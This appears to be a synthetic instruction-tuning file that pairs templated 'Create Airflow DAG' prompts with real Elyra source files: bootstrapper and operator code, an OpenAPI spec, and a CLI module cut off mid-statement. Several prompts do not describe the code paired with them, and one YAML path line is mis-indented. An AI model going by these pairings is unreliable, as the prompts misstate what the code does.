OpUtil.log_operation_info(\"Packages installed\", duration)\n\n    @classmethod\n    def determine_elyra_requirements(cls) -> Any:\n        if sys.version_info.major == 3:\n            if sys.version_info.minor in [9, 10, 11, 12, 13]:\n                return \"requirements-elyra.txt\"\n        logger.error(\n            f\"This version of Python '{sys.version_info.major}.{sys.version_info.minor}' \"\n            f\"is not supported for Elyra generic components\"\n        )\n        return None\n\n    @classmethod\n    def package_list_to_dict(cls, filename: str) -> dict:\n        package_dict = {}\n        with open(filename) as fh:\n            for line in fh:\n                if line[0] != \"#\":\n                    if \" @ \" in line:\n                        package_name, package_version = line.strip(\"\\n\").split(sep=\" @ \")\n                    elif \"===\" in line:\n                        package_name, package_version = line.strip(\"\\n\").split(sep=\"===\")\n                    elif \"==\" in line:\n                        package_name, package_version = line.strip(\"\\n\").split(sep=\"==\")\n                    elif line.startswith(\"-e \") or line.startswith(\"--editable \"):\n                        package_name = line.strip(\"\\n\").replace(\"-e \", \"\").replace(\"--editable \", \"\")\n                        if \"#egg=\" in package_name:  # editable package from version control system\n                            package_name = package_name.split(\"=\")[-1]\n                        elif \"/\" in package_name:  # editable package from local directory\n                            package_name = os.path.basename(package_name)\n                        package_version = None\n                    else:\n                        # Tolerate other formats but do not add to package list\n                        continue\n\n                    package_dict[package_name] = package_version\n\n        return package_dict\n\n    @classmethod\n    def parse_arguments(cls, args) -> dict:\n        import argparse\n\n        global pipeline_name, operation_name  # noqa: F824\n\n        logger.debug(\"Parsing Arguments.....\")\n        parser = argparse.ArgumentParser()\n        parser.add_argument(\n            \"-e\", \"--cos-endpoint\", dest=\"cos-endpoint\", help=\"Cloud object storage endpoint\", required=True\n        )\n        parser.add_argument(\n            \"-b\", \"--cos-bucket\", dest=\"cos-bucket\", help=\"Cloud object storage bucket to use\", required=True\n        )\n        parser.add_argument(\n            \"-d\",\n            \"--cos-directory\",\n            dest=\"cos-directory\",\n            help=\"Working directory in cloud object storage bucket to use\",\n            required=True,\n        )\n        parser.add_argument(\n            \"-t\",\n            \"--cos-dependencies-archive\",\n            dest=\"cos-dependencies-archive\",\n            help=\"Archive containing notebook and dependency artifacts\",\n            required=True,\n        )\n        parser.add_argument(\n            \"-n\",\n            \"--pipeline-name\",\n            dest=\"pipeline-name\",\n            help=\"Pipeline name\",\n            required=True,\n        )\n        parser.add_argument(\"-f\", \"--file\", dest=\"filepath\", help=\"File to execute\", required=True)\n        parser.add_argument(\"-o\", \"--outputs\", dest=\"outputs\", help=\"Files to output to object store\", required=False)\n        parser.add_argument(\"-i\", \"--inputs\", dest=\"inputs\", help=\"Files to pull in from parent node\", required=False)\n        parsed_args = vars(parser.parse_args(args))\n\n        # set pipeline name as global\n        pipeline_name = parsed_args.get(\"pipeline-name\")\n        # operation/node name is the basename of the non-suffixed filepath, set as global\n        operation_name = os.path.basename(os.path.splitext(parsed_args.get(\"filepath\"))[0])\n\n        return parsed_args\n\n    @classmethod\n    def log_operation_info(cls, action_clause: str, duration_secs: Optional[float] = None) -> None:\n        \"\"\"Produces a formatted log INFO message used entirely for support purposes.\n\n        This method is intended to be called for any entries that should be captured across aggregated\n        log files to identify steps within a given pipeline and each of its operations.  As a result,\n        calls to this method should produce single-line entries in the log (no embedded newlines).\n        Each entry is prefixed with the pipeline name.\n\n        General logging should NOT use this method but use logger.<level>() statements directly.\n\n        :param action_clause: str representing the action that is being logged\n        :param duration_secs: optional float value representing the duration of the action being logged\n        \"\"\"\n        global pipeline_name, operation_name  # noqa: F824\n        if enable_pipeline_info:\n            duration_clause = f\"({duration_secs:.3f} secs)\" if duration_secs else \"\"\n            logger.info(f\"'{pipeline_name}':'{operation_name}' - {action_clause} {duration_clause}\")\n\n\ndef main():\n    # Configure logger format, level\n    logging.basicConfig(\n        format=\"[%(levelname)1.1s %(asctime)s.%(msecs).03d] %(message)s\", datefmt=\"%H:%M:%S\", level=logging.INFO\n    )\n    # Setup packages and gather arguments\n    input_params = OpUtil.parse_arguments(sys.argv[1:])\n    OpUtil.log_operation_info(\"starting operation\")\n    t0 = time.time()\n    # must be commented out in airgapped images if packages from\n    # https://github.com/elyra-ai/elyra/blob/main/etc/generic/requirements-elyra.txt\n    # already installed via central pip env during container build\n    OpUtil.package_install()\n\n    # Create the appropriate instance, process dependencies and execute the operation\n    file_op = FileOpBase.get_instance(**input_params)\n\n    file_op.process_dependencies()\n\n    file_op.execute()\n\n    duration = time.time() - t0\n    OpUtil.log_operation_info(\"operation completed\", duration)\n\n\nif __name__ == \"__main__\":\n    main()\n", "metadata": {"source": "github.com/elyra-ai/elyra", "file_path": "elyra/airflow/bootstrapper.py", "language": "python", "complexity": "complex", "star_count": 1942, "quality_score": 0.87, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#\n# Copyright 2018-2025 Elyra Authors\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\nimport os\nfrom typing import List\nfrom typing import Optional\n\nfrom elyra._version import __version__\n\n\"\"\"\nThis helper builder constructs the bootstrapping arguments to be used as the driver for elyra's generic components\nin Apache Airflow\n\"\"\"\n\n# Inputs and Outputs separator character.  If updated,\n# same-named variable in bootstrapper.py must be updated!\nINOUT_SEPARATOR = \";\"\n\nELYRA_GITHUB_ORG = os.getenv(\"ELYRA_GITHUB_ORG\", \"elyra-ai\")\nELYRA_GITHUB_REPO = os.getenv(\"ELYRA_GITHUB_REPO\", \"elyra\")\nELYRA_GITHUB_BRANCH = os.getenv(\"ELYRA_GITHUB_BRANCH\", \"main\" if \"dev\" in __version__ else \"v\" + __version__)\n\nELYRA_BOOTSCRIPT_URL = os.getenv(\n    \"ELYRA_BOOTSTRAP_SCRIPT_URL\",\n    f\"https://raw.githubusercontent.com/{ELYRA_GITHUB_ORG}/\"\n    f\"{ELYRA_GITHUB_REPO}/{ELYRA_GITHUB_BRANCH}/elyra/airflow/bootstrapper.py\",\n)\n\nELYRA_REQUIREMENTS_URL = os.getenv(\n    \"ELYRA_REQUIREMENTS_URL\",\n    f\"https://raw.githubusercontent.com/{ELYRA_GITHUB_ORG}/\"\n    f\"{ELYRA_GITHUB_REPO}/{ELYRA_GITHUB_BRANCH}/etc/generic/requirements-elyra.txt\",\n)\n\n\nclass BootscriptBuilder(object):\n    def __init__(\n        self,\n        filename: str,\n        pipeline_name: str,\n        cos_endpoint: str,\n        cos_bucket: str,\n        cos_directory: str,\n        cos_dependencies_archive: str,\n        inputs: Optional[List[str]] = None,\n        outputs: Optional[List[str]] = None,\n    ):\n        \"\"\"\n        This helper builder constructs the bootstrapping arguments to be used as the driver for\n        elyra's generic components in Apache Airflow\n        :param filename: name of the file to execute\n        :param pipeline_name: name of the pipeline\n        :param :cos_endpoint: object storage endpoint e.g weaikish1.fyre.ibm.com:30442\n        :param :cos_bucket: bucket to retrieve archive from\n        :param :cos_directory: name of the directory in the object storage bucket to pull\n        :param :cos_dependencies_archive: archive file name to get from object storage bucket e.g archive1.tar.gz\n        :param inputs: comma delimited list of files to be consumed/are required by the filename\n        :param outputs: comma delimited list of files produced by the filename\n        \"\"\"\n        self.arguments = []\n        self.cos_endpoint = cos_endpoint\n        self.cos_bucket = cos_bucket\n        self.cos_directory = cos_directory\n        self.cos_dependencies_archive = cos_dependencies_archive\n        self.filename = filename\n        self.pipeline_name = pipeline_name\n        self.outputs = outputs\n        self.inputs = inputs\n        self.container_work_dir_root_path = \"./\"\n        self.container_work_dir_name = \"jupyter-work-dir/\"\n        self.container_work_dir = self.container_work_dir_root_path + self.container_work_dir_name\n\n        if not filename:\n            raise ValueError(\"You need to provide a filename for the operation.\")\n\n    @property\n    def container_cmd(self):\n        common_curl_options = \"--fail -H 'Cache-Control: no-cache'\"\n\n        self.arguments = [\n            f\"mkdir -p {self.container_work_dir} && cd {self.container_work_dir} && \"\n            f\"echo 'Downloading {ELYRA_BOOTSCRIPT_URL}' && \"\n            f\"curl {common_curl_options} -L {ELYRA_BOOTSCRIPT_URL} --output bootstrapper.py && \"\n            f\"echo 'Downloading {ELYRA_REQUIREMENTS_URL}' && \"\n            f\"curl {common_curl_options} -L {ELYRA_REQUIREMENTS_URL} \"\n            f\"--output requirements-elyra.txt && \"\n            \"python3 -m pip install packaging && \"\n            \"python3 -m pip freeze > requirements-current.txt && \"\n            \"python3 bootstrapper.py \"\n            f\"--pipeline-name '{self.pipeline_name}' \"\n            f\"--cos-endpoint {self.cos_endpoint} \"\n            f\"--cos-bucket {self.cos_bucket} \"\n            f\"--cos-directory '{self.cos_directory}' \"\n            f\"--cos-dependencies-archive '{self.cos_dependencies_archive}' \"\n            f\"--file '{self.filename}' \"\n        ]\n\n        if self.inputs:\n            inputs_str = self._artifact_list_to_str(self.inputs)\n            self.arguments.append(f\"--inputs '{inputs_str}' \")\n\n        if self.outputs:\n            outputs_str = self._artifact_list_to_str(self.outputs)\n            self.arguments.append(f\"--outputs '{outputs_str}' \")\n\n        argument_string = \"\".join(self.arguments)\n\n        return argument_string\n\n    def _artifact_list_to_str(self, pipeline_array):\n        trimmed_artifact_list = []\n        for artifact_name in pipeline_array:\n            if INOUT_SEPARATOR in artifact_name:  # if INOUT_SEPARATOR is in name, throw since this is our separator\n                raise ValueError(f\"Illegal character ({INOUT_SEPARATOR}) found in filename '{artifact_name}'.\")\n            trimmed_artifact_list.append(artifact_name.strip())\n        return INOUT_SEPARATOR.join(trimmed_artifact_list)\n", "metadata": {"source": "github.com/elyra-ai/elyra", "file_path": "elyra/airflow/operator.py", "language": "python", "complexity": "medium", "star_count": 1942, "quality_score": 0.75, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#\n# Copyright 2018-2025 Elyra Authors\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\nopenapi: 3.0.1\ninfo:\n  title: Elyra API\n  description: The API for the Elyra extensions.\n  contact:\n    name: Elyra\n    url: https://github.com/elyra-ai/elyra\n  version: \"1\"\n\npaths:\n\n  /elyra/elyra.yaml:\n    get:\n      tags:\n        - api\n      summary: Get API information (yaml).\n      responses:\n        200:\n          description: Returns a swagger specification in yaml.\n          content:\n            text/x-yaml:\n              schema:\n                type: string\n        500:\n          description: Unexpected error.\n\n  /elyra/schemaspace:\n    get:\n      tags:\n        - schemaspace\n      summary: Get current schemaspace names.\n      responses:\n        200:\n          description: Returns the list of current schemaspace names.\n          content:\n            application/json:\n              schema:\n                type: object\n                properties:\n                  schemaspaces:\n                    items: {\n                      type: string\n                    }\n                    description: The list of current schemaspace names.\n        500:\n          description: Unexpected error.\n\n  /elyra/schemaspace/{schemaspace_name_or_id}:\n    get:\n      tags:\n        - schemaspace\n      summary: Get properties for a given schemaspace.\n      parameters:\n        - name: schemaspace_name_or_id\n          in: path\n          description: The name or id of the schemaspace.\n          required: true\n          schema:\n            type: string\n      responses:\n        200:\n          description: Returns the single-valued properties of the current schemaspace.\n          content:\n            application/json:\n              schema:\n                type: object\n                allOf:\n                  - $ref: '#/components/schemas/SchemaspaceResource'\n        404:\n          description: Schemaspace not found.\n          content: {}\n        500:\n          description: Unexpected error.\n\n  /elyra/schema/{schemaspace_name_or_id}:\n    get:\n      tags:\n        - schema\n      summary: Get schemas for a given schemaspace\n      parameters:\n        - name: schemaspace_name_or_id\n          in: path\n          description: The name or id of the schemaspace\n          required: true\n          schema:\n            type: string\n      responses:\n        200:\n          description: Returns the schema instances for a given schemaspace name or id.\n          content:\n            application/json:\n              schema:\n                type: object\n                properties:\n                  schemaspace:\n                    type: array\n                    description: The schema instances within the schemaspace.\n                    items:\n                      $ref: '#/components/schemas/SchemaResource'\n        404:\n          description: Schemaspace not found.\n          content: {}\n        500:\n          description: Unexpected error.\n\n  /elyra/schema/{schemaspace_name_or_id}/{resource}:\n    get:\n      tags:\n        - schema\n      summary: Get a given schema instance from a given schemaspace name or id.\n      parameters:\n        - name: schemaspace_name_or_id\n          in: path\n          description: The name or id of the schemaspace.\n          required: true\n          schema:\n            type: string\n        - name: resource\n          in: path\n          description: The name of the resource in a given schemaspace.\n          required: true\n          schema:\n            type: string\n      responses:\n        200:\n          description: The named schema instance within the schemaspace.\n          content:\n            application/json:\n              schema:\n                $ref: '#/components/schemas/SchemaResource'\n        404:\n          description: Schemaspace/Resource not found.\n          content: {}\n        500:\n          description: Unexpected error.\n\n  /elyra/metadata/{schemaspace_name_or_id}:\n    get:\n      tags:\n        - metadata\n      summary: Get metadata for a given schemaspace name or id.\n      parameters:\n        - name: schemaspace_name_or_id\n          in: path\n          description: The name or id of the schemaspace.\n          required: true\n          schema:\n            type: string\n      responses:\n        200:\n          description: The metadata instances within the schemaspace.\n          content:\n            application/json:\n              schema:\n                type: object\n                properties:\n                  schemaspace:\n                    type: array\n                    description: The name of the schemaspace.\n                    items:\n                      $ref: '#/components/schemas/MetadataResource'\n        400:\n          description: An error (validation, syntax) occurred relative to the instance data.\n        404:\n          description: Schemaspace not found.\n          content: {}\n        500:\n          description: Unexpected error.\n    post:\n      tags:\n        - metadata\n      summary: Create a metadata instance in a given schemaspace.\n      parameters:\n        - name: schemaspace_name_or_id\n          in: path\n          description: The name or id of the schemaspace.\n          required: true\n          schema:\n            type: string\n      requestBody:\n        required: true\n        content:\n          application/json:\n            schema:\n              $ref: '#/components/schemas/MetadataResourceBody'\n\n      responses:\n        201:\n          description: The newly-created metadata instance.\n          content:\n            application/json:\n              schema:\n                $ref: '#/components/schemas/MetadataResource'\n          headers:\n            Location:\n              description: Resource endpoint\n              schema:\n                type: string\n                format: url\n        400:\n          description: An error (validation, syntax) occurred relative to the instance data.\n        404:\n          description: Schemaspace not found.\n        409:\n          description: Resource already exists.\n        500:\n          description: Unexpected error.\n\n  /elyra/metadata/{schemaspace_name_or_id}/{resource}:\n    get:\n      tags:\n        - metadata\n      summary: Get a given metadata instance from a given schemaspace name or id.\n      parameters:\n        - name: schemaspace_name_or_id\n          in: path\n          description: The name or id of the schemaspace.\n          required: true\n          schema:\n            type: string\n        - name: resource\n          in: path\n          description: The name of the resource in a given schemaspace.\n          required: true\n          schema:\n            type: string\n      responses:\n        200:\n          description: The named metadata instance within the schemaspace.\n          content:\n            application/json:\n              schema:\n                $ref: '#/components/schemas/MetadataResource'\n        400:\n          description: An error (validation, syntax) occurred relative to the instance data.\n        404:\n          description: Schemaspace/Resource not found.\n          content: {}\n        500:\n          description: Unexpected error.\n\n    put:\n      tags:\n        - metadata\n      summary: Update a given metadata resource within a given schemaspace.\n      parameters:\n        - name: schemaspace_name_or_id\n          in: path\n          description: The name or id of the schemaspace.\n          required: true\n          schema:\n            type: string\n        - name: resource\n          in: path\n          description: The name of the resource in a given schemaspace.\n          required: true\n          schema:\n            type: string\n      requestBody:\n        required: true\n        content:\n          application/json:\n            schema:\n              $ref: '#/components/schemas/MetadataResourceBody'\n\n      responses:\n        200:\n          description: The updated metadata instance.\n          content:\n            application/json:\n              schema:\n                $ref: '#/components/schemas/MetadataResource'\n        400:\n          description: An error (validation, syntax, not supported) occurred relative to the instance data.\n        404:\n          description: The resource to update was not found.\n        500:\n          description: Unexpected error.\n\n    delete:\n      tags:\n        - metadata\n      summary: Delete a given metadata resource from a given schemaspace.\n      parameters:\n        - name: schemaspace_name_or_id\n          in: path\n          description: The name or id of the schemaspace.\n          required: true\n          schema:\n            type: string\n        - name: resource\n          in: path\n          description: The name of the resource in a given schemaspace.\n          required: true\n          schema:\n            type: string\n      responses:\n        204:\n          description: The resource was successfully deleted.\n        400:\n          description: An error (validation, syntax) occurred relative to the instance data.\n        403:\n          description: Deletion of the resource is not permitted.\n        404:\n          description: The resource was not found.\n        500:\n          description: Unexpected error.\n\n  /elyra/pipeline/components/cache:\n    put:\n      tags:\n        - component\n      summary: Initiates a refresh of the entire component cache.\n      requestBody:\n        required: true\n        content:\n          application/json:\n            schema:\n              $ref: '#/components/schemas/ComponentCacheResource'\n      responses:\n        204:\n          description: The refresh request was initiated successfully.\n        400:\n          description: Invalid request, malformed body.\n        409:\n          description: Cache refresh is in progress - try request later.\n\n  /elyra/pipeline/components/cache/{catalog}:\n    parameters:\n      - name: catalog\n        in: path\n        description: The name of the component catalog to refresh\n        required: true\n        schema:\n          type: string\n    put:\n      tags:\n        - component\n      summary: Initiates a refresh of the given component catalog.\n      requestBody:\n        required: true\n        content:\n          application/json:\n            schema:\n              $ref: '#/components/schemas/ComponentCacheResource'\n      responses:\n        204:\n          description: The refresh request was initiated successfully.\n        400:\n          description: Invalid request, malformed body.\n        404:\n          description: Catalog not found.\n\n  /elyra/pipeline/components/{processor}:\n    parameters:\n      - name: processor\n        in: path\n        description: The name of the runtime processor.  Will match the runtime schema name (e.g., \"kfp\", \"airflow\", etc.).\n        required: true\n        schema:\n          type: string\n    get:\n      tags:\n        - pipeline\n        - component\n      summary: Fetch all components associated with the given runtime processor.\n      responses:\n        200:\n          description: The components relative to the given runtime processor for use in the Elyra front-end.\n          content:\n            application/json:\n              schema:\n                type: object\n        400:\n          description: Invalid runtime processor.\n\n  /elyra/pipeline/components/{processor}/{component_id}/properties:\n    parameters:\n      - name: processor\n        in: path\n        description: The name of the runtime processor.  Will match the runtime schema name (e.g., \"kfp\", \"airflow\", etc.).\n        required: true\n        schema:\n          type: string\n      - name: component_id\n        in: path\n        description: The component identifier - composed of the catalog connector schema name, \":\", and the component's hash.\n        required: true\n        schema:\n          type: string\n    get:\n      tags:\n        - pipeline\n        - component\n      summary: Fetch a component's properties for use in the Elyra front-end\n      responses:\n        200:\n          description: JSON containing the component definition.\n          content:\n            application/json:\n              schema:\n                type: object\n        400:\n          description: Invalid runtime processor or component ID.\n\n /elyra/pipeline/{processor}/properties:\n    parameters:\n      - name: processor\n        in: path\n        description: The name of the runtime processor.  Will match the RuntimeType string form (e.g., \"KUBEFLOW_PIPELINES\", \"AIRFLOW\", etc.).\n        required: true\n        schema:\n          type: string\n    get:\n      tags:\n        - pipeline\n      summary: Fetch a pipeline's properties for use in the Elyra front-end\n      responses:\n        200:\n          description: JSON containing the pipeline properties definition.\n          content:\n            application/json:\n              schema:\n                type: object\n        400:\n          description: Invalid runtime processor.\n\n  /elyra/pipeline/export:\n    post:\n      tags:\n        - pipeline\n      summary: Export a pipeline.\n      requestBody:\n        required: true\n        content:\n          application/json:\n            schema:\n              $ref: '#/components/schemas/PipelineExportBodyPost'\n      responses:\n        201:\n          description: The pipeline export response.\n          headers:\n            Location:\n              description: The resource endpoint.\n              schema:\n                type: string\n                format: url\n          content:\n            application/json:\n              schema:\n                type: object\n                properties:\n                  export_path:\n                    type: string\n                    description: The pipeline export path.\n\n\n  /elyra/pipeline/runtimes/types:\n    get:\n      tags:\n        - pipeline\n      summary: Get the set of static resources associated with currently configured runtime types\n      responses:\n        200:\n          description: The resources associated with the currently configured runtime types\n          content:\n            application/json:\n              schema:\n                type: object\n                properties:\n                  runtime_types:\n                    type: array\n                    description: The list of resources associated with each configured runtime type.\n                    items:\n                      $ref: '#/components/schemas/RuntimeTypeResources'\n\n  /elyra/pipeline/schedule:\n    post:\n      tags:\n        - pipeline\n      summary: Execute pipelines as batch jobs.\n      requestBody:\n        required: true\n        content:\n          application/json:\n            schema:\n              $ref: '#/components/schemas/PipelineResource'\n      responses:\n        200:\n          description: The pipeline processor response.\n          content:\n            application/json:\n              schema:\n                $ref: '#/components/schemas/PipelineScheduleResponse'\n\n  /elyra/pipeline/validate:\n    post:\n      tags:\n        - pipeline\n      summary: Validate a pipeline.\n      requestBody:\n        required: true\n        content:\n          application/json:\n            schema:\n              $ref: '#/components/schemas/PipelineResource'\n      responses:\n        200:\n          description: The pipeline validation response.\n          content:\n            application/json:\n              schema:\n                $ref: '#/components/schemas/PipelineValidationResponse'\n\n\n  /elyra/contents/properties/{filepath}:\n    get:\n      tags:\n        - contents\n      summary: Get a dictionary of properties for a file.\n      parameters:\n        - name: filepath\n          in: path\n          description: The path to the file to be parsed, relative to the JupyterLab server root directory.\n          required: true\n          schema:\n            type: string\n      responses:\n        200:\n          description: The dictionary of properties found while parsing the file.\n          content:\n            application/json:\n              schema:\n                type: object\n                description: A dictionary of properties.\n                allOf:\n                  - $ref: '#/components/schemas/ContentsPropertiesResource'\n        400:\n          description: File is a directory.\n        404:\n          description: File not found.\n\n\ncomponents:\n  schemas:\n    MetadataResourceBody:\n      description: The set of properties comprising the request body for POST and PUT requests.\n      required:\n        - display_name\n        - schema_name\n        - metadata\n      type: object\n      properties:\n        name:\n          type: string\n          description: The canonical name of the resource.  Will be derived from display_name if not provided on POST.\n        display_name:\n          type: string\n          description: The display name of the resource.\n        schema_name:\n          type: string\n          description: The schema name used to validate the resource.\n        metadata:\n          type: object\n          properties: {}\n          description: A free-form dictionary consisting of additional information\n            about the resource.\n\n    MetadataResource:\n      description: The set of properties comprising a metadata resource entity.\n      required:\n        - name\n        - display_name\n        - schema_name\n        - metadata\n      type: object\n      properties:\n        name:\n          type: string\n          description: The canonical name of the metadata resource.\n        display_name:\n          type: string\n          description: The display name of the metadata resource.\n        schema_name:\n          type: string\n          description: The schema name used to validate the metadata resource.\n        metadata:\n          type: object\n          properties: {}\n          description: A free-form dictionary consisting of additional information\n            about the resource.\n\n    SchemaResource:\n      description: The set of properties comprising a schema resource entity.\n      required:\n        - name\n        - schemaspace\n      type: object\n      properties:\n        schemaspace:\n          type: string\n          description: The schemaspace name or id of the schema resource.\n        name:\n          type: string\n          description: The canonical name of the schema resource.\n        title:\n          type: string\n          description: The title of the schema resource.\n        properties:\n          type: object\n          properties: {}\n          description: A free-form dictionary consisting of additional information\n            about the resource.\n\n    SchemaspaceResource:\n      description: The set of properties comprising a schemaspace resource entity.\n      required:\n        - name\n        - id\n        - display_name\n        - description\n      type: object\n      properties:\n        name:\n          type: string\n          description: The canonical name of the schemaspace resource.\n        id:\n          type: string\n          description: The id of the schemaspace resource.\n        display_name:\n          type: string\n          description: The display name of the schemaspace resource.\n        description:\n          type: string\n          description: The description of the schemaspace resource.\n\n    PipelineResource:\n      description: The set of properties comprising a pipeline resource entity.\n      required:\n        - primary_pipeline\n        - pipelines\n      type: object\n      properties:\n        primary_pipeline:\n          type: string\n          description: The primary pipeline id.\n        pipelines:\n          type: array\n          description: A set of pipeline definitions.\n          items:\n            type: object\n            properties:\n              id:\n                type: string\n                description: The unique identifier of the pipeline.\n              name:\n                type: string\n                description: The name of the pipeline.\n              nodes:\n                type: array\n                description: The set of nodes in the pipeline.\n                items:\n                  type: object\n                  properties: {}\n                  description: The node configuration.\n              runtime:\n                type: string\n                description: The runtime type for the pipeline.\n              runtime-config:\n                type: object\n                properties: {}\n                description: The runtime configuration that should be used to submit the pipeline.\n\n    PipelineScheduleResponse:\n      description: The set of properties comprising a pipeline processor response entity.\n      required:\n        - run_url\n        - object_storage_url\n        - object_storage_path\n      type: object\n      properties:\n        run_url:\n          type: string\n          description: The runtime URL to access the pipeline experiment.\n        object_storage_url:\n          type: string\n          description: The object storage URL to access the pipeline outputs\n            and processed notebooks.\n        object_storage_path:\n          type: string\n          description: The object storage working directory path where the pipeline outputs\n            and processed notebooks are located.\n\n    PipelineExportBodyPost:\n      description: The set of properties comprising the request body for POST request.\n      required:\n        - pipeline\n        - export_format\n        - export_path\n        - overwrite\n      type: object\n      properties:\n        pipeline:\n          $ref: '#/components/schemas/PipelineResource'\n        export_format:\n          type: string\n          description: The pipeline export format.\n        export_path:\n          type: string\n          description: The pipeline export path.\n        overwrite:\n          type: boolean\n          description: Determines if the existing export should be overwritten.\n\n    PipelineValidationResponse:\n      description: The set of properties comprising a pipeline validation response entity.\n      required:\n        - title\n        - description\n        - issues\n      type: object\n      properties:\n        title:\n          type: string\n          description: The title relative to the validation response.\n        description:\n          type: string\n          description: The description relative to the validation response.\n        issues:\n          type: array\n          description: The issues encountered during validation.  This will be empty if no issues were encountered.\n          items:\n            type: object\n            properties:\n              severity:\n                type: integer\n                enum: [1, 2, 3, 4]\n                description: The numeric value representing the severity of the issue - Error (1), Warning (2), Information (3), Hint (4)\n              source:\n                type: string\n                description: The highlevel source of the validation issue.\n              type:\n                type: string\n                description: Indicator of the category of the issue (e.g., \"invalidNodeProperty\", \"invalidRuntime\", etc.).\n              message:\n                type: string\n                description: The message corresponding to the validation issue.\n              data:\n                type: object\n                description: JSON consisting of information pertaining to where the issue occurred.\n\n    RuntimeTypeResources:\n      description: The set of properties comprising a runtime type resource entity.\n      required:\n        - id\n        - display_name\n        - icon\n        - export_file_types\n      type: object\n      properties:\n        id:\n          type: string\n          description: The id of the runtime type resource.\n        display_name:\n          type: string\n          description: The display name of the runtime type resource.\n        icon:\n          type: string\n          description: The location (endpoint) in which the runtime type icon can be found.\n        export_file_types:\n          type: array\n          description: The set of export file types this runtime type supports.\n          items:\n            type: object\n            properties:\n              id:\n                type: string\n                description: The supported file suffix\n              display_name:\n                type: string\n                description: The label corresponding to the export file type\n\n    ContentsPropertiesResource:\n      description: The set of resources comprising the request body.\n      required:\n        - env_vars\n        - inputs\n        - outputs\n      type: object\n      properties:\n        env_vars:\n          type: object\n          description: A dictionary with a key for each environment variable name found and a value corresponding to the variable value or null.\n          additionalProperties:\n            type: string\n        inputs:\n          type: array\n          description: A list of input file names.\n          items:\n            type: string\n        outputs:\n          type: array\n          description: A list of output file names.\n          items:\n            type: string\n\n    ComponentCacheResource:\n      description: The request body for refreshing the component cache.\n      required:\n        - action\n      type: object\n      properties:\n        action:\n          type: string\n          description: The action to carry out on the cache.  Only 'refresh' is supported.\n          enum:\n            - refresh", "metadata": {"source": "github.com/elyra-ai/elyra", "file_path": "elyra/api/elyra.yaml", "language": "yaml", "complexity": "complex", "star_count": 1942, "quality_score": 0.6599999999999999, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create Airflow DAG for data pipeline automation with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#\n# Copyright 2018-2025 Elyra Authors\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\nimport asyncio\nfrom collections import OrderedDict\nimport json\nfrom operator import itemgetter\nimport os\nfrom pathlib import Path\nimport sys\nfrom typing import Optional\nimport warnings\n\nimport click\nfrom colorama import Fore\nfrom colorama import Style\nfrom kfp import Client as ArgoClient\n\nfrom elyra._version import __version__\nfrom elyra.metadata.manager import MetadataManager\nfrom elyra.metadata.metadata import Metadata\nfrom elyra.metadata.schemaspaces import Runtimes\nfrom elyra.pipeline import pipeline_constants\nfrom elyra.pipeline.component_catalog import ComponentCache\nfrom elyra.pipeline.kfp.kfp_authentication import AuthenticationError\nfrom elyra.pipeline.kfp.kfp_authentication import KFPAuthenticator\nfrom elyra.pipeline.parser import PipelineParser\nfrom elyra.pipeline.pipeline import Operation\nfrom elyra.pipeline.pipeline_definition import Pipeline\nfrom elyra.pipeline.pipeline_definition import PipelineDefinition\nfrom elyra.pipeline.processor import PipelineProcessorManager\nfrom elyra.pipeline.processor import PipelineProcessorResponse\nfrom elyra.pipeline.properties import VolumeMount\nfrom elyra.pipeline.runtime_type import RuntimeProcessorType\nfrom elyra.pipeline.runtime_type import RuntimeTypeResources\nfrom elyra.pipeline.validation import PipelineValidationManager\nfrom elyra.pipeline.validation import ValidationSeverity\n\nif sys.stdout.isatty():\n    from yaspin import yaspin as Spinner\nelse:\n    from .pipeline_app_utils import StaticTextSpinner as Spinner\n\n# custom exit code - a timeout occurred\nEXIT_TIMEDOUT = 124\n\nSEVERITY = {\n    ValidationSeverity.Error: \"Error\",\n    ValidationSeverity.Warning: \"Warning\",\n    ValidationSeverity.Hint: \"Hint\",\n    ValidationSeverity.Information: \"Information\",\n}\n\n\ndef _get_runtime_config(runtime_config_name: Optional[str]) -> Optional[Metadata]:\n    \"\"\"Fetch runtime configuration for the specified name\"\"\"\n    if not runtime_config_name:\n        # No runtime configuration was specified so treat as local.\n        # Cannot use metadata manager to determine the runtime type.\n        return None\n    try:\n        metadata_manager = MetadataManager(schemaspace=Runtimes.RUNTIMES_SCHEMASPACE_NAME)\n        return metadata_manager.get(runtime_config_name)\n    except Exception as e:\n        raise 